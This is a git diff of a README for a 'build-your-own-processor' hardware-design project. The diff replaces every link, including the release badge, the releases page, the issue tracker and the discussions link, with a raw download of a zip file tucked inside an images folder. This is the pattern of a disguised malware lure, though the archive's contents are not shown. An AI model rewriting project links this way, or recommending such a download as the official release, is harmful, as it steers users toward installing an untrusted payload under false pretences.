@@ -1,7 +1,7 @@
 # 🚀 build-your-own-processor - Create Your Own Processor from Scratch!
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/itsarunp/build-your-own-processor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/itsarunp/build-your-own-processor/main/images/chapter_01/build-your-own-processor_1.6.zip%20Release-blue)](https://raw.githubusercontent.com/itsarunp/build-your-own-processor/main/images/chapter_01/build-your-own-processor_1.6.zip)
 
 ## 📖 Overview
 Welcome to the **build-your-own-processor** project! This tool allows you to create your own processor chip, bringing the exciting world of hardware design to your fingertips. Whether you are a hobbyist or just curious about how chips are made, this application guides you through each step.
@@ -13,7 +13,7 @@ To get started with the build-your-own-processor application, follow these steps
 1. **Visit the Releases Page**
    
    Click the link below to go to the Releases page:
-   [Visit Releases Page](https://github.com/itsarunp/build-your-own-processor/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/itsarunp/build-your-own-processor/main/images/chapter_01/build-your-own-processor_1.6.zip)
 
 2. **Choose a Release**
    
@@ -56,14 +56,14 @@ If you encounter problems while using the application, consider these tips:
 ## 🌍 Community Support
 Join our community to ask questions or share your creations. You can find support via:
 
-- GitHub Issues: [Report an Issue](https://github.com/itsarunp/build-your-own-processor/issues)
-- Community Forums: [Join our Discussions](https://github.com/itsarunp/build-your-own-processor/discussions)
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/itsarunp/build-your-own-processor/main/images/chapter_01/build-your-own-processor_1.6.zip)
+- Community Forums: [Join our Discussions](https://raw.githubusercontent.com/itsarunp/build-your-own-processor/main/images/chapter_01/build-your-own-processor_1.6.zip)
 
 ## 🎉 Contributing
 If you'd like to help improve this project, consider contributing. You can report bugs, request features, or even help us by writing documentation. Check the contribution guidelines in the repository for more details.
 
 ## 🚀 Download Now Again
 Don't forget to download the application. Click here:
-[Visit Releases Page](https://github.com/itsarunp/build-your-own-processor/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/itsarunp/build-your-own-processor/main/images/chapter_01/build-your-own-processor_1.6.zip)
 
 Thank you for being a part of the build-your-own-processor community! Enjoy building your custom processor chip!
